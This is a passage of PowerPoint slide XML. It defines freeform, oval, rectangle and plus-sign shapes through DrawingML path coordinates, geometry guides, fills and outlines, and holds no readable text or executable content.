                  <a:gd name="T0" fmla="*/ 101396 w 182"/>
                  <a:gd name="T1" fmla="*/ 468 h 172"/>
                  <a:gd name="T2" fmla="*/ 17619 w 182"/>
                  <a:gd name="T3" fmla="*/ 25518 h 172"/>
                  <a:gd name="T4" fmla="*/ 12976 w 182"/>
                  <a:gd name="T5" fmla="*/ 24724 h 172"/>
                  <a:gd name="T6" fmla="*/ 0 w 182"/>
                  <a:gd name="T7" fmla="*/ 5582 h 172"/>
                  <a:gd name="T8" fmla="*/ 94937 w 182"/>
                  <a:gd name="T9" fmla="*/ 0 h 172"/>
                  <a:gd name="T10" fmla="*/ 101396 w 182"/>
                  <a:gd name="T11" fmla="*/ 468 h 172"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 182"/>
                  <a:gd name="T19" fmla="*/ 0 h 172"/>
                  <a:gd name="T20" fmla="*/ 182 w 182"/>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182" h="172">
                    <a:moveTo>
                      <a:pt x="182" y="3"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="32" y="172"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="23" y="166"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="171" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="182" y="3"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98449" name="Freeform 105"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2371" y="1435"/>
                <a:ext cx="363" cy="116"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 2167 h 96"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 15792 h 96"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 2618 h 96"/>
                  <a:gd name="T6" fmla="*/ 0 w 287"/>
                  <a:gd name="T7" fmla="*/ 684 h 96"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 0 h 96"/>
                  <a:gd name="T10" fmla="*/ 163251 w 287"/>
                  <a:gd name="T11" fmla="*/ 2167 h 96"/>
                  <a:gd name="T12" fmla="*/ 163251 w 287"/>
                  <a:gd name="T13" fmla="*/ 2167 h 96"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T19" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T20" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T21" fmla="*/ 0 w 287"/>
                  <a:gd name="T22" fmla="*/ 0 h 96"/>
                  <a:gd name="T23" fmla="*/ 287 w 287"/>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7" h="96">
                    <a:moveTo>
                      <a:pt x="287" y="13"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="96"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="13"/>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50" name="Freeform 106"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2332" y="1232"/>
                <a:ext cx="230" cy="208"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 101396 w 182"/>
                  <a:gd name="T1" fmla="*/ 549 h 173"/>
                  <a:gd name="T2" fmla="*/ 17111 w 182"/>
                  <a:gd name="T3" fmla="*/ 25059 h 173"/>
                  <a:gd name="T4" fmla="*/ 12334 w 182"/>
                  <a:gd name="T5" fmla="*/ 23995 h 173"/>
                  <a:gd name="T6" fmla="*/ 0 w 182"/>
                  <a:gd name="T7" fmla="*/ 5465 h 173"/>
                  <a:gd name="T8" fmla="*/ 94840 w 182"/>
                  <a:gd name="T9" fmla="*/ 0 h 173"/>
                  <a:gd name="T10" fmla="*/ 101396 w 182"/>
                  <a:gd name="T11" fmla="*/ 549 h 173"/>
                  <a:gd name="T12" fmla="*/ 101396 w 182"/>
                  <a:gd name="T13" fmla="*/ 549 h 173"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T19" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T20" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T21" fmla="*/ 0 w 182"/>
                  <a:gd name="T22" fmla="*/ 0 h 173"/>
                  <a:gd name="T23" fmla="*/ 182 w 182"/>
                  <a:gd name="T24" fmla="*/ 173 h 1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73">
                    <a:moveTo>
                      <a:pt x="182" y="4"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="31" y="173"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="22" y="166"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="170" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="182" y="4"/>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51" name="Freeform 107"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2343" y="1237"/>
                <a:ext cx="242" cy="203"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 114015 w 191"/>
                  <a:gd name="T1" fmla="*/ 16844 h 169"/>
                  <a:gd name="T2" fmla="*/ 13859 w 191"/>
                  <a:gd name="T3" fmla="*/ 23863 h 169"/>
                  <a:gd name="T4" fmla="*/ 0 w 191"/>
                  <a:gd name="T5" fmla="*/ 5384 h 169"/>
                  <a:gd name="T6" fmla="*/ 103024 w 191"/>
                  <a:gd name="T7" fmla="*/ 0 h 169"/>
                  <a:gd name="T8" fmla="*/ 114015 w 191"/>
                  <a:gd name="T9" fmla="*/ 16844 h 169"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 191"/>
                  <a:gd name="T16" fmla="*/ 0 h 169"/>
                  <a:gd name="T17" fmla="*/ 191 w 191"/>
                  <a:gd name="T18" fmla="*/ 169 h 169"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="191" h="169">
                    <a:moveTo>
                      <a:pt x="191" y="119"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="23" y="169"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="39"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="173" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="191" y="119"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98452" name="Freeform 108"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2360" y="1251"/>
                <a:ext cx="208" cy="175"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 85546 w 165"/>
                  <a:gd name="T1" fmla="*/ 16357 h 145"/>
                  <a:gd name="T2" fmla="*/ 10273 w 165"/>
                  <a:gd name="T3" fmla="*/ 23288 h 145"/>
                  <a:gd name="T4" fmla="*/ 0 w 165"/>
                  <a:gd name="T5" fmla="*/ 5404 h 145"/>
                  <a:gd name="T6" fmla="*/ 77887 w 165"/>
                  <a:gd name="T7" fmla="*/ 0 h 145"/>
                  <a:gd name="T8" fmla="*/ 85546 w 165"/>
                  <a:gd name="T9" fmla="*/ 16357 h 145"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 165"/>
                  <a:gd name="T16" fmla="*/ 0 h 145"/>
                  <a:gd name="T17" fmla="*/ 165 w 165"/>
                  <a:gd name="T18" fmla="*/ 145 h 145"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="165" h="145">
                    <a:moveTo>
                      <a:pt x="165" y="102"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="20" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="34"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="150" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="165" y="102"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98453" name="Freeform 109"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2372" y="1380"/>
                <a:ext cx="363" cy="155"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 6639 h 129"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 18316 h 129"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 7118 h 129"/>
                  <a:gd name="T6" fmla="*/ 95402 w 287"/>
                  <a:gd name="T7" fmla="*/ 0 h 129"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 6639 h 129"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 287"/>
                  <a:gd name="T16" fmla="*/ 0 h 129"/>
                  <a:gd name="T17" fmla="*/ 287 w 287"/>
                  <a:gd name="T18" fmla="*/ 129 h 129"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="287" h="129">
                    <a:moveTo>
                      <a:pt x="287" y="47"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="129"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="50"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="168" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="47"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98454" name="Freeform 110"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2342" y="1237"/>
                <a:ext cx="241" cy="203"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 101903 w 191"/>
                  <a:gd name="T1" fmla="*/ 16636 h 169"/>
                  <a:gd name="T2" fmla="*/ 12299 w 191"/>
                  <a:gd name="T3" fmla="*/ 23863 h 169"/>
                  <a:gd name="T4" fmla="*/ 0 w 191"/>
                  <a:gd name="T5" fmla="*/ 5384 h 169"/>
                  <a:gd name="T6" fmla="*/ 93122 w 191"/>
                  <a:gd name="T7" fmla="*/ 0 h 169"/>
                  <a:gd name="T8" fmla="*/ 101903 w 191"/>
                  <a:gd name="T9" fmla="*/ 16636 h 169"/>
                  <a:gd name="T10" fmla="*/ 101903 w 191"/>
                  <a:gd name="T11" fmla="*/ 16636 h 169"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 191"/>
                  <a:gd name="T19" fmla="*/ 0 h 169"/>
                  <a:gd name="T20" fmla="*/ 191 w 191"/>
                  <a:gd name="T21" fmla="*/ 169 h 169"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T12">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T15">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T16">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                  <a:cxn ang="T17">
                    <a:pos x="T10" y="T11"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T18" t="T19" r="T20" b="T21"/>
                <a:pathLst>
                  <a:path w="191" h="169">
                    <a:moveTo>
                      <a:pt x="191" y="118"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="23" y="169"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="39"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="174" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="191" y="118"/>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55" name="Freeform 111"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2371" y="1379"/>
                <a:ext cx="363" cy="156"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 6366 h 130"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 17862 h 130"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 6956 h 130"/>
                  <a:gd name="T6" fmla="*/ 95402 w 287"/>
                  <a:gd name="T7" fmla="*/ 0 h 130"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 6366 h 130"/>
                  <a:gd name="T10" fmla="*/ 163251 w 287"/>
                  <a:gd name="T11" fmla="*/ 6366 h 130"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 287"/>
                  <a:gd name="T19" fmla="*/ 0 h 130"/>
                  <a:gd name="T20" fmla="*/ 287 w 287"/>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287" h="130">
                    <a:moveTo>
                      <a:pt x="287" y="47"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="130"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="51"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="168" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="47"/>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8344" name="AutoShape 112"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2280" y="1051"/>
              <a:ext cx="91" cy="81"/>
            </a:xfrm>
            <a:prstGeom prst="plus">
              <a:avLst>
                <a:gd name="adj" fmla="val 25000"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="CCFFCC"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="98345" name="Group 113"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks noChangeAspect="1"/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="609" y="676"/>
              <a:ext cx="760" cy="447"/>
              <a:chOff x="1680" y="1824"/>
              <a:chExt cx="777" cy="480"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98433" name="Oval 114"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2007" y="2162"/>
                <a:ext cx="201" cy="142"/>
              </a:xfrm>
              <a:prstGeom prst="ellipse">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="996633"/>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p>
                <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
                <a:endParaRPr lang="en-US" altLang="en-US" sz="900">
                  <a:solidFill>
                    <a:schemeClr val="tx2"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98434" name="Rectangle 115"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2159" y="1838"/>
                <a:ext cx="179" cy="11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tIns="18288" rIns="45720" bIns="18288" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
                <a:endParaRPr lang="en-US" altLang="en-US" sz="900">
                  <a:solidFill>
                    <a:schemeClr val="tx2"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98435" name="Rectangle 116"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1935" y="1838"/>
                <a:ext cx="170" cy="11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tIns="18288" rIns="45720" bIns="18288" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
                <a:endParaRPr lang="en-US" altLang="en-US" sz="900">
                  <a:solidFill>
                    <a:schemeClr val="tx2"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98436" name="Rectangle 117"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm rot="10800000">
                <a:off x="1779" y="2176"/>
                <a:ext cx="180" cy="11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45720" tIns="18288" rIns="45720" bIns="18288" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
                <a:endParaRPr lang="en-US" altLang="en-US" sz="900">
                  <a:solidFill>
                    <a:schemeClr val="tx2"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98437" name="Rectangle 118"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1680" y="2064"/>
                <a:ext cx="777" cy="12"/>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38" name="Rectangle 119"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1775"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39" name="Rectangle 120"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1863"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40" name="Rectangle 121"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm rot="10800000">
                <a:off x="2256" y="2176"/>
                <a:ext cx="180" cy="11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45720" tIns="18288" rIns="45720" bIns="18288" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
                <a:endParaRPr lang="en-US" altLang="en-US" sz="900">
                  <a:solidFill>
                    <a:schemeClr val="tx2"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98441" name="Oval 122"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1680" y="1824"/>
                <a:ext cx="201" cy="142"/>
              </a:xfrm>
              <a:prstGeom prst="ellipse">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="996633"/>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p>
                <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
                <a:endParaRPr lang="en-US" altLang="en-US" sz="900">
                  <a:solidFill>
                    <a:schemeClr val="tx2"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98442" name="Rectangle 123"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2016"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43" name="Rectangle 124"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2243"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44" name="Rectangle 125"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2102"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45" name="Rectangle 126"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2340"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grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="98346" name="Group 127"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks noChangeAspect="1"/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="609" y="1468"/>
              <a:ext cx="760" cy="447"/>
              <a:chOff x="1680" y="1824"/>
              <a:chExt cx="777" cy="480"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98420" name="Oval 128"/>
